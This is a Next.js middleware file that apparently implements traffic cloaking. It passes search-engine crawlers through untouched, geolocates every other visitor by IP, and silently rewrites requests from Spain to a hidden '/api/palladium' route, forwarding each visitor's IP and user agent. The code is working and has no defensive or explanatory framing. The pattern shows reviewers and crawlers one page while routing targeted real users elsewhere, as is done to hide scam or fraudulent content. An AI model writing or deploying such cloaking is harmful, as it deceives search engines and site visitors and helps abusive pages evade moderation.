import { NextRequest, NextResponse } from 'next/server';

function isBot(ua: string) {
    return /googlebot|bingbot|yandex|duckduckbot|baiduspider/i.test(ua);
}

export async function middleware(req: NextRequest) {
    const ua = req.headers.get('user-agent')?.toLowerCase() || '';
    const ip =
        req.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
        req.headers.get('x-real-ip') ||
        '8.8.8.8';

    if (isBot(ua)) return NextResponse.next();

    try {
        const geoRes = await fetch(`https://ipwho.is/${ip}`);
        const geo = await geoRes.json();

        if (geo.success && geo.country_code === 'ES') {
            const url = req.nextUrl.clone();
            url.pathname = '/api/palladium';
            url.searchParams.set('ip', ip);
            url.searchParams.set('ua', ua);
            return NextResponse.rewrite(url);
        }

        return NextResponse.next();
    } catch (err) {
        console.error('[MIDDLEWARE ERROR]', err);
        return NextResponse.next();
    }
}

export const config = {
    matcher: ['/', '/((?!_next|api|static|favicon.ico|fonts|images|css|js).*)'],
};
